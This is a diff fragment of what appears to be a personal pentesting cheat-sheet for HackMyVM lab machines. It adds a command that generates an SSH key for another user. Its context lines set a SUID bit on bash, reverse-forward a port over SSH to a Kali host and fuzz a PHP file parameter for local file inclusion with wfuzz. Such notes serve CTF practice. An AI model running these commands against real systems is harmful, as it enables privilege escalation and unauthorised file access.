@@ -135,6 +135,9 @@ chmod +s /bin/bash
 #### Remote --- SSH Port forwarding local service 8080 to remote IP 8081  - HackMyVM Box Controller
 ```ssh -R 192.168.10.101:8081:127.0.0.1:8080 root@<KALI IP> ```
 
+#### Create SSH key for another user
+```ssh-keygen -C john@darkhole```
+
 #### Fuzzing LFI
 > 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" ```
 > 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP ```
